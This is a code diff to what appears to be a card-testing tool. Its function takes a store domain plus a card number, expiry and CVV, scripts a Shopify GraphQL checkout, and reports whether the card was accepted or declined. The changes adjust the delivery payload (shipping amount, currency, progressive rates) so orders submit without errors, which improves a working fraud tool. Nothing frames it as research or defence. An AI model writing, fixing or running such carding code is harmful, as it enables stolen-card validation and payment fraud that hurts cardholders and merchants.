@@ -481,7 +481,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
         return None, "No shipping available", gw_name, None
 
     step2_vars = _make_vars()
-    step2_vars['delivery'] = _build_selected_delivery(delivery_strategy, addr_block, phone)
+    step2_vars['delivery'] = _build_selected_delivery(delivery_strategy, addr_block, phone, shipping_amount, currency)
     step2_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': addr_block}}
     result2 = await _negotiate(client, graphql_url, gql_headers, step2_vars)
     _update_qt(result2)
@@ -509,7 +509,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     try:
         payment_input = {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id, 'sessionId': payment_token, 'billingAddress': {'streetAddress': addr_block}, 'cardSource': None}}, 'amount': {'value': {'amount': running_total, 'currencyCode': currency}}, 'dueAt': None}], 'billingAddress': {'streetAddress': addr_block}}
         step3_vars = _make_vars()
-        step3_vars['delivery'] = _build_selected_delivery(delivery_strategy, addr_block, phone)
+        step3_vars['delivery'] = _build_selected_delivery(delivery_strategy, addr_block, phone, shipping_amount, currency)
         step3_vars['payment'] = payment_input
         result3 = await _negotiate(client, graphql_url, gql_headers, step3_vars)
         _update_qt(result3)
@@ -524,7 +524,7 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
 
     # Submit order - use the exact same delivery block from negotiate
     # to avoid DELIVERY_LINE_DETAIL_CHANGED error
-    submit_delivery = _build_selected_delivery(delivery_strategy, addr_block, phone)
+    submit_delivery = _build_selected_delivery(delivery_strategy, addr_block, phone, shipping_amount, currency)
     submit_merch = {'stableId': stable_id, 'merchandise': merch_block['merchandise'], 'quantity': {'items': {'value': 1}}, 'expectedTotalPrice': {'any': True}, 'lineComponentsSource': None, 'lineComponents': []}
     checkout_token = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
     attempt_token = checkout_token.group(1) if checkout_token else checkout_url.split('/')[-1].split('?')[0]
@@ -738,17 +738,17 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     return running_total, "Declined - No Bank Response", gw_name, {'amount': running_total}
 
 
-def _build_selected_delivery(delivery_strategy, addr_block, phone):
+def _build_selected_delivery(delivery_strategy, addr_block, phone, shipping_amount='0', currency='USD'):
     return {
         'deliveryLines': [{
             'destination': {'streetAddress': addr_block},
             'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}},
             'targetMerchandiseLines': {'any': True},
             'deliveryMethodTypes': ['SHIPPING'],
-            'expectedTotalPrice': {'any': True},
+            'expectedTotalPrice': {'value': {'amount': shipping_amount, 'currencyCode': currency}},
             'destinationChanged': False,
         }],
-        'noDeliveryRequired': [], 'useProgressiveRates': False,
+        'noDeliveryRequired': [], 'useProgressiveRates': True,
         'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
     }
 
